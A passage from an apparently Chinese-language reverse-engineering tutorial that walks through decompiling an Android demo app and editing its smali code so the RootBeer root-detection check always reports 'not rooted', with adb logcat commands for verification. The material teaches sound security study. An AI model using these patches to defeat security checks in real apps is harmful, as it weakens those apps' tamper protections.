class=\"token class-name\">Bundle</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>view<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LayoutInflater</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>view<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>view<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ViewGroup</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">android<span class=\"token punctuation\">.</span>widget<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">androidx<span class=\"token punctuation\">.</span>fragment<span class=\"token punctuation\">.</span>app<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Fragment</span><span class=\"token punctuation\">;</span><br><span class=\"token keyword\">import</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>scottyab<span class=\"token punctuation\">.</span>rootbeer<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><br><span class=\"token comment\">/* loaded from: classes.dex */</span><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FirstFragment</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Fragment</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token annotation punctuation\">@Override</span> <span class=\"token comment\">// androidx.fragment.app.Fragment</span><br>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">View</span> <span class=\"token function\">onCreateView</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">LayoutInflater</span> layoutInflater<span class=\"token punctuation\">,</span> <span class=\"token class-name\">ViewGroup</span> viewGroup<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Bundle</span> bundle<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> layoutInflater<span class=\"token punctuation\">.</span><span class=\"token function\">inflate</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>layout<span class=\"token punctuation\">.</span>fragment_first<span class=\"token punctuation\">,</span> viewGroup<span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token annotation punctuation\">@Override</span> <span class=\"token comment\">// androidx.fragment.app.Fragment</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onViewCreated</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">View</span> view<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Bundle</span> bundle<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">onViewCreated</span><span class=\"token punctuation\">(</span>view<span class=\"token punctuation\">,</span> bundle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        view<span class=\"token punctuation\">.</span><span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>button_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setOnClickListener</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">View<span class=\"token punctuation\">.</span>OnClickListener</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">// from class: com.cymetrics.demo.FirstFragment.1</span><br>            <span class=\"token annotation punctuation\">@Override</span> <span class=\"token comment\">// android.view.View.OnClickListener</span><br>            <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onClick</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">View</span> view2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">TextView</span> textView <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">)</span> view2<span class=\"token punctuation\">.</span><span class=\"token function\">getRootView</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>textview_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">(</span>view2<span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">isRooted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    textView<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Rooted!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>                    textView<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Safe, not rooted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token punctuation\">}</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>主要的邏輯是這一段：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onClick</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">View</span> view2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token class-name\">TextView</span> textView <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">)</span> view2<span class=\"token punctuation\">.</span><span class=\"token function\">getRootView</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">R</span><span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">.</span>textview_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">(</span>view2<span class=\"token punctuation\">.</span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">isRooted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        textView<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Rooted!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span><br>        textView<span class=\"token punctuation\">.</span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Safe, not rooted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這一段會去呼叫一個第三方的 library 檢查是否有 root，有的話就顯示 <code>Rooted!</code>，沒有的話就顯示 <code>Safe, not rooted</code>。</p>\n<p>在研究程式碼邏輯時，我們可以看著 java 程式碼，但如果要改 code 的話，就不是改 java code 這麼簡單了，我們必須要直接去改 smali 的 code，才能把 app 重新打包回去。</p>\n<h2 id=\"%E4%BF%AE%E6%94%B9-smali-%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E4%BF%AE%E6%94%B9-smali-%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> 修改 smali 程式碼</h2>\n<p>還記得我們用 Apktool 解開的資料夾嗎？smali 程式碼就在那裡面，路徑是：<code>smali/com/cymetrics/demo/FirstFragment$1.smali</code>，仔細找一下內容，就可以找到 onClick 的程式碼：</p>\n<pre class=\"language-java\"><code class=\"language-java\"># virtual methods<br><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> <span class=\"token function\">onClick</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">2</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">32</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">getRootView</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><br><br>    move<span class=\"token operator\">-</span>result<span class=\"token operator\">-</span>object v0<br><br>    <span class=\"token keyword\">const</span> v1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x7f08011c</span><br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v0<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">findViewById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">I</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><br><br>    move<span class=\"token operator\">-</span>result<span class=\"token operator\">-</span>object v0<br><br>    check<span class=\"token operator\">-</span>cast v0<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>widget<span class=\"token operator\">/</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">34</span><br>    <span class=\"token keyword\">new</span><span class=\"token operator\">-</span>instance v1<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>view<span class=\"token operator\">/</span><span class=\"token class-name\">View</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">getContext</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>content<span class=\"token operator\">/</span><span class=\"token class-name\">Context</span><span class=\"token punctuation\">;</span><br><br>    move<span class=\"token operator\">-</span>result<span class=\"token operator\">-</span>object p1<br><br>    invoke<span class=\"token operator\">-</span>direct <span class=\"token punctuation\">{</span>v1<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>init<span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>content<span class=\"token operator\">/</span><span class=\"token class-name\">Context</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">35</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">isRooted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result p1<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>eqz p1<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_0<br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string p1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Rooted!\"</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">36</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>widget<span class=\"token operator\">/</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">CharSequence</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token keyword\">goto</span> <span class=\"token operator\">:</span>goto_0<br><br>    <span class=\"token operator\">:</span>cond_0<br>    <span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string p1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Safe, not rooted\"</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">38</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>widget<span class=\"token operator\">/</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">CharSequence</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br>    <span class=\"token operator\">:</span>goto_0<br>    <span class=\"token keyword\">return</span><span class=\"token operator\">-</span><span class=\"token keyword\">void</span><br><span class=\"token punctuation\">.</span>end method</code></pre>\n<p>簡單講解一下一些基礎的 smali 語法，<code>.method public onClick(Landroid/view/View;)V</code> 就是說有一個 public 的 method 叫做 onClick，接收一個參數類型是 <code>android/view/View</code>，括號最後面的 V 則代表 void，沒有回傳值。</p>\n<p><code>.locals 2</code> 指的是這個 function 會用到兩個暫存器，也就是 v0 跟 v1，如果你用到 v2 的話就會出錯，因此如果需要更多暫存器，記得要改這邊。</p>\n<p>參數的話會用 p 來表示，通常 p0 代表 this，p1 就是第一個參數，因此 <code>invoke-virtual {p1}, Landroid/view/View;-&gt;getRootView()Landroid/view/View;</code> 就是把第一個參數丟進去呼叫 <code>getRootView()</code> 這個 method。</p>\n<p>而這整段裡面，核心的程式碼是這一段：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span>line <span class=\"token number\">35</span><br>invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">isRooted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>move<span class=\"token operator\">-</span>result p1<br><br><span class=\"token keyword\">if</span><span class=\"token operator\">-</span>eqz p1<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_0<br><br><span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string p1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Rooted!\"</span><br><br><span class=\"token punctuation\">.</span>line <span class=\"token number\">36</span><br>invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>widget<span class=\"token operator\">/</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">CharSequence</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br><span class=\"token keyword\">goto</span> <span class=\"token operator\">:</span>goto_0<br><br><span class=\"token operator\">:</span>cond_0<br><span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string p1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Safe, not rooted\"</span></code></pre>\n<p><code>if-eqz p1, :cond_0</code> 指的就是如果 p1 是 0，就跳到 <code>:cond_0</code> 的地方，而 p1 是 <code>RootBeer-&gt;isRooted()</code> 的回傳值。也就是說，p1 代表著 root 檢查的結果，只要能把 p1 改掉，就能偽造不同的結果。</p>\n<p>這邊有很多種改法，例如說把原本的 <code>if-eqz</code> 改成 <code>if-nez</code>，就可以反轉邏輯，或我們可以直接將 p1 硬改成 0，順便加上 log 確認我們有執行到這裡：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span>line <span class=\"token number\">35</span><br>invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">isRooted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>move<span class=\"token operator\">-</span>result p1<br><br># 加上 log，印出 <span class=\"token string\">\"we are here\"</span><br><span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string v1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"we are here\"</span><br>invoke<span class=\"token operator\">-</span><span class=\"token keyword\">static</span> <span class=\"token punctuation\">{</span>v1<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>util<span class=\"token operator\">/</span><span class=\"token class-name\">Log</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">e</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">I</span><br><br># 將 p1 直接硬改成 <span class=\"token number\">0</span><br><span class=\"token keyword\">const</span><span class=\"token operator\">/</span><span class=\"token number\">4</span> p1<span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span><br><br><span class=\"token keyword\">if</span><span class=\"token operator\">-</span>eqz p1<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_0<br><br><span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string p1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Rooted!\"</span><br><br><span class=\"token punctuation\">.</span>line <span class=\"token number\">36</span><br>invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>v0<span class=\"token punctuation\">,</span> p1<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Landroid</span><span class=\"token operator\">/</span>widget<span class=\"token operator\">/</span><span class=\"token class-name\">TextView</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">setText</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">CharSequence</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">V</span><br><br><span class=\"token keyword\">goto</span> <span class=\"token operator\">:</span>goto_0<br><br><span class=\"token operator\">:</span>cond_0<br><span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string p1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Safe, not rooted\"</span></code></pre>\n<p>加上那三行以後存檔，接著照著上一篇講的重新打包，安裝在手機上，打開 app 以後先看 log。</p>\n<p>要看 Android 的 log 的話，需要用 <code>adb logcat</code> 這個指令來看，但如果你直接輸入這個指令，會噴一堆 log 出來，在這邊教大家兩個好用的指令。</p>\n<p>第一個是 <code>adb logcat -c</code>，可以清掉之前的 log，第二個是：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">adb logcat --pid<span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">`</span>adb shell pidof -s com.cymetrics.demo<span class=\"token variable\">`</span></span></code></pre>\n<p>可以看到指定 package name 的 log，排除其他雜訊，這個真的很好用。</p>\n<p>準備就緒以後，按下 app 內的 <code>CHECK ROOT</code> 按鈕，就會看到一條新的 log：</p>\n<pre class=\"language-shell\"><code class=\"language-shell\">01-25 09:32:06.528 <span class=\"token number\">27651</span> <span class=\"token number\">27651</span> E we are here: we are here</code></pre>\n<p>以及畫面上出現的 <code>Safe, not rooted</code> 的字樣，就大功告成了。</p>\n<h2 id=\"%E6%9B%B4%E6%94%B9%E5%85%B6%E4%BB%96%E5%9C%B0%E6%96%B9%E7%9A%84%E7%A8%8B%E5%BC%8F%E7%A2%BC\"><a class=\"direct-link\" href=\"#%E6%9B%B4%E6%94%B9%E5%85%B6%E4%BB%96%E5%9C%B0%E6%96%B9%E7%9A%84%E7%A8%8B%E5%BC%8F%E7%A2%BC\">#</a> 更改其他地方的程式碼</h2>\n<p>剛剛我們改動了 fragment 中的程式碼，也就是程式的邏輯，把 <code>isRooted()</code> 的回傳值取代掉，讓它永遠是 false，繞過了檢查。</p>\n<p>但如果程式中還有其他地方也會做類似的檢查那就麻煩了，因為我們必須找出每一個做檢查的地方，然後都做類似的事情，把每一處都改掉。</p>\n<p>因此，一個比較有效率的方法是直接去改動這個第三方 library 的程式碼，讓 <code>isRooted</code> 永遠都回傳 false，這樣就算 app 在多個地方都有檢查，也會一起被繞過。</p>\n<p>呼叫 function 時的程式碼是 <code>Lcom/scottyab/rootbeer/RootBeer;-&gt;isRooted()</code>，因此我們可以順藤摸瓜找到這個檔案：<code>com/scottyab/rootbeer/RootBeer.smali</code>，搜尋 <code>isRooted</code> 就會找到程式碼：</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token punctuation\">.</span>method <span class=\"token keyword\">public</span> <span class=\"token function\">isRooted</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br>    <span class=\"token punctuation\">.</span>locals <span class=\"token number\">1</span><br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">44</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">detectRootManagementApps</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>nez v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_1<br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">detectPotentiallyDangerousApps</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>nez v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_1<br><br>    <span class=\"token keyword\">const</span><span class=\"token operator\">-</span>string v0<span class=\"token punctuation\">,</span> <span class=\"token string\">\"su\"</span><br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">,</span> v0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">checkForBinary</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Ljava</span><span class=\"token operator\">/</span>lang<span class=\"token operator\">/</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>nez v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_1<br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">45</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">checkForDangerousProps</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>nez v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_1<br><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">checkForRWPaths</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\">Z</span><br><br>    move<span class=\"token operator\">-</span>result v0<br><br>    <span class=\"token keyword\">if</span><span class=\"token operator\">-</span>nez v0<span class=\"token punctuation\">,</span> <span class=\"token operator\">:</span>cond_1<br><br>    <span class=\"token punctuation\">.</span>line <span class=\"token number\">46</span><br>    invoke<span class=\"token operator\">-</span>virtual <span class=\"token punctuation\">{</span>p0<span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Lcom</span><span class=\"token operator\">/</span>scottyab<span class=\"token operator\">/</span>rootbeer<span class=\"token operator\">/</span><span class=\"token class-name\">RootBeer</span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span 